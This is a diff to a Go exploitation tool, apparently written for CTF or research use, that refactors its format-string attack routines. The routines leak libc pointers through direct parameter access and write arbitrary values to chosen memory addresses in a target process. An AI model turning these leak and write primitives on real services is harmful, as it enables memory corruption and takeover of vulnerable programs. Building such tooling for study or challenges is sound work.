@@ -37,10 +37,10 @@ func main() {
 
 	var proc *process.Process
 	if strings.Contains(flag.Arg(0), ":") {
-		proc = process.DialOrExit("tcp", flag.Arg(0))
+		proc = process.DialOrExit("tcp", flag.Arg(0), process.X86_64Info())
 	} else {
 		cmd := exec.Command(flag.Arg(0))
-		proc = process.StartOrExit(cmd)
+		proc = process.ExecOrExit(cmd, process.X86_64Info())
 		log.Printf("pid: %d", cmd.Process.Pid)
 	}
 	proc.SetLogger(muyVerbose)
@@ -51,29 +51,26 @@ func main() {
 
 func leakParams(proc *process.Process) {
 	leaker := memory.NewDPAFormatStringLeakerOrExit(memory.DPAFormatStringConfig{
-		ProcessIOFn: func() memory.ProcessIO {
-			return proc
-		},
+		ProcessIO:    proc,
 		MaxNumParams: 200,
-		PointerSize:  8,
 		Verbose:      verbose,
 	})
 
 	if verbose != nil {
-		verbose.Printf("format string example: '%s'", leaker.FormatString(1))
+		verbose.Printf("format string example: '%s'", leaker.PointerFormatString(1))
 	}
 
 	log.Printf("press enter when ready")
 	fmt.Scanln()
 
-	pm := memory.PointerMakerForX68_64()
+	pm := memory.PointerMakerForX86_64()
 
 	// _IO_2_1_stderr_      - 0x7f7997d8e5c0 - 21
 	// _IO_file_jumps       - 0x7f7997d8f4a0 - 28
 	//__libc_start_main+234 - 0x7fa0bed99d0a - 45
-	_IO_2_1_stderr_ := leaker.MemoryAtParamOrExit(21)
-	_IO_file_jumps := leaker.MemoryAtParamOrExit(28)
-	__libc_start_main234 := pm.FromHexBytesOrExit(leaker.MemoryAtParamOrExit(45), binary.BigEndian)
+	_IO_2_1_stderr_ := leaker.RawPointerAtParamOrExit(21)
+	_IO_file_jumps := leaker.RawPointerAtParamOrExit(28)
+	__libc_start_main234 := pm.FromHexBytesOrExit(leaker.RawPointerAtParamOrExit(45), binary.BigEndian)
 
 	log.Printf("_IO_2_1_stderr_: %s | _IO_file_jumps %s | __libc_start_main 0x%x",
 		_IO_2_1_stderr_, _IO_file_jumps, __libc_start_main234.Uint()-234)
@@ -84,16 +81,13 @@ func leakParams(proc *process.Process) {
 
 func leakLocalLibcSymbolParamNumbers(proc *process.Process) {
 	leaker := memory.NewDPAFormatStringLeakerOrExit(memory.DPAFormatStringConfig{
-		ProcessIOFn: func() memory.ProcessIO {
-			return proc
-		},
+		ProcessIO:    proc,
 		MaxNumParams: 200,
-		PointerSize:  8,
 		Verbose:      verbose,
 	})
 
 	if verbose != nil {
-		verbose.Printf("format string exmple: '%s'", leaker.FormatString(1))
+		verbose.Printf("format string exmple: '%s'", leaker.PointerFormatString(1))
 	}
 
 	for {
@@ -115,19 +109,16 @@ func leakLocalLibcSymbolParamNumbers(proc *process.Process) {
 
 func leakMemoryAtLoop(proc *process.Process) {
 	leaker := memory.SetupFormatStringLeakViaDPAOrExit(memory.DPAFormatStringConfig{
-		ProcessIOFn: func() memory.ProcessIO {
-			return proc
-		},
+		ProcessIO:    proc,
 		MaxNumParams: 200,
-		PointerSize:  8,
 		Verbose:      verbose,
 	})
 
-	pm := memory.PointerMakerForX68_64()
+	pm := memory.PointerMakerForX86_64()
 
 	if verbose != nil {
 		verbose.Printf("format string example: '%s'",
-			leaker.FormatString(pm.FromUint(4141414141414141)))
+			leaker.FormatString(pm.FromUint(0x4141414141414141)))
 	}
 
 	for {
@@ -155,24 +146,21 @@ func writeMemoryLoop(proc *process.Process) {
 	writer := memory.NewDPAFormatStringWriterOrExit(memory.DPAFormatStringWriterConfig{
 		MaxWrite:  999,
 		DPAConfig: memory.DPAFormatStringConfig{
-			ProcessIOFn: func() memory.ProcessIO {
-				return proc
-			},
+			ProcessIO:    proc,
 			MaxNumParams: 200,
-			PointerSize:  8,
 			Verbose:      verbose,
 		},
 	})
 
+	pm := memory.PointerMakerForX86_64()
+
 	if verbose != nil {
-		str, err := writer.Lower4BytesFormatString(10)
+		str, err := writer.LowerFourBytesFormatString(10, pm.FromUint(0x4141414141414141))
 		if err != nil {
 			log.Fatalf("failed to get format string for verbose log - %s", err)
 		}
 		verbose.Printf("format string is 0x%x", str)
 	}
-
-	pm := memory.PointerMakerForX68_64()
 
 	for {
 		log.Printf("please enter a memory address to write to and a number followed by 'enter':")
@@ -201,7 +189,7 @@ func writeMemoryLoop(proc *process.Process) {
 			continue
 		}
 
-		writer.WriteLower4BytesAtOrExit(num, pointer)
+		writer.WriteLowerFourBytesAtOrExit(num, pointer)
 
 		log.Printf("wrote %d to %s", num, pointer.HexString())
 	}
